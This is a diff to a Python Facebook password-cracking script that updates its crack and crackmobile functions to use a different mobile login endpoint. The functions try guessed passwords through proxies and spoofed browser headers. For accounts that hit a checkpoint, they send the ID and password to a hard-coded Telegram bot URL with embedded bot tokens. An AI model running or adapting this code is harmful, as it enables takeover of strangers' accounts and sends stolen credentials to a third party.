@@ -523,32 +523,13 @@ def crack(idf,pwv):
 			if 'uadia' in uadarimu: ua = uadia[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
-			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr")
-			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
+			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1660001490161%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28bfc806a6b584%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff3f55e35a64044%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Den_US%26logger_id%3Dfb88aaee50ada8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df274b65f04b38a8%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff3f55e35a64044%2526relation%253Dopener%2526frame%253Df2846be910b6aec%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df274b65f04b38a8%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff3f55e35a64044%26relation%3Dopener%26frame%3Df2846be910b6aec%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v13.0/dialog/oauth?app_id=957549474255294&cbt=1663658203099&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df36011fe59bf83%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff227780f3c7a4%26relation%3Dopener&client_id=957549474255294&display=touch&domain=shopee.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fshopee.co.id%2Fbuyer%2Flogin%3Ffrom%3D%252F%26next%3D%252F&locale=en_US&logger_id=f280887a91e3514&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df29f22ac8ad3974%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff227780f3c7a4%26relation%3Dopener%26frame%3Df192bb46a06fdac&tp=unspecified","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={
-			"Host": "m.facebook.com",
-			"content-length": f"{len(str(dataa))}",
-			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
-			"origin": "https://m.facebook.com",
-			"content-type": "application/x-www-form-urlencoded",
-			"user-agent": ua,
-			"accept": "*/*",
-			"x-requested-with": "com.microsoft.bing",
-			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-			"sec-ch-ua-platform": '"Android"',
-			"sec-ch-ua-mobile": "?1",
-			"sec-fetch-site": "same-origin",
-			"sec-fetch-mode": "cors",
-			"sec-fetch-dest": "empty",
-			"sec-fetch-user": "?1",
-			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr",
-			"accept-encoding": "gzip, deflate br",
-			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-			}
-			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=966242223397117&auth_token=9af15271c748d378ef8bc2b720b79e63&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&refsrc=deprecated&app_id=966242223397117&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1660001490161%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28bfc806a6b584%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff3f55e35a64044%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Den_US%26logger_id%3Dfb88aaee50ada8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df274b65f04b38a8%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff3f55e35a64044%2526relation%253Dopener%2526frame%253Df2846be910b6aec%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df274b65f04b38a8%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff3f55e35a64044%26relation%3Dopener%26frame%3Df2846be910b6aec%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				requests.post(f"https://api.telegram.org/bot5442935736:AAHjdbHR1eokgcUhA8DnYYQqBxp4nXLKafM/sendMessage?chat_id=-1001808963086&text={idf}\n{pw}")
 				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
@@ -699,64 +680,13 @@ def crackmobile(idf,pwv):
 			if 'uadia' in uadarimu: ua = uadia[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
-			ses.headers.update({
-				"Host": "m.facebook.com",
-				"cache-control": "max-age=0",
-				"user-agent": ua,
-				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-				"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-				"sec-ch-ua-mobile": "?1",
-				"sec-fetch-site": "same-origin",
-				"sec-fetch-mode": "cors",
-				"sec-fetch-dest": "empty",
-				"sec-fetch-user": "?1",
-				"upgrade-insecure-requests": "1",
-				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-				})
-			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr")
-			dataa ={
-			'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 
-			'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 
-			'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 
-			'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1),
-			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1),
-			'try_number': '0', 
-			'unrecognized_tries': '0', 
-			'email': idf, 
-			'encpass': f'#PWD_BROWSER:0:{random.randint(0000000000, 9999999999)}:{pw}',
-			'first_prefill_source':'',
-			'first_prefill_source':'type',
-			'prefill_contact_point':'',
-			'prefill_type': '', 
-			'prefill_source': '', 
-			'prefill_type': '', 
-			'had_cp_prefilled': False, 
-			'had_password_prefilled': False, 
-			'is_smart_lock': False
-			}
+			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1660001490161%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28bfc806a6b584%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff3f55e35a64044%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Den_US%26logger_id%3Dfb88aaee50ada8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df274b65f04b38a8%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff3f55e35a64044%2526relation%253Dopener%2526frame%253Df2846be910b6aec%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df274b65f04b38a8%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff3f55e35a64044%26relation%3Dopener%26frame%3Df2846be910b6aec%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v13.0/dialog/oauth?app_id=957549474255294&cbt=1663658203099&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df36011fe59bf83%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff227780f3c7a4%26relation%3Dopener&client_id=957549474255294&display=touch&domain=shopee.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fshopee.co.id%2Fbuyer%2Flogin%3Ffrom%3D%252F%26next%3D%252F&locale=en_US&logger_id=f280887a91e3514&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df29f22ac8ad3974%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff227780f3c7a4%26relation%3Dopener%26frame%3Df192bb46a06fdac&tp=unspecified","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={
-			"Host": "m.facebook.com",
-			"content-length": f"{len(str(dataa))}",
-			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
-			"origin": "https://m.facebook.com",
-			"content-type": "application/x-www-form-urlencoded",
-			"user-agent": ua,
-			"accept": "*/*",
-			"x-requested-with": "com.microsoft.bing",
-			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-			"sec-ch-ua-platform": '"Android"',
-			"sec-ch-ua-mobile": "?1",
-			"sec-fetch-site": "same-origin",
-			"sec-fetch-mode": "cors",
-			"sec-fetch-dest": "empty",
-			"sec-fetch-user": "?1",
-			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr",
-			"accept-encoding": "gzip, deflate br",
-			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-			}
-			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=966242223397117&auth_token=9af15271c748d378ef8bc2b720b79e63&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&refsrc=deprecated&app_id=966242223397117&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1660001490161%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28bfc806a6b584%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff3f55e35a64044%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Den_US%26logger_id%3Dfb88aaee50ada8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df274b65f04b38a8%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff3f55e35a64044%2526relation%253Dopener%2526frame%253Df2846be910b6aec%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df274b65f04b38a8%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff3f55e35a64044%26relation%3Dopener%26frame%3Df2846be910b6aec%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}")
 				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
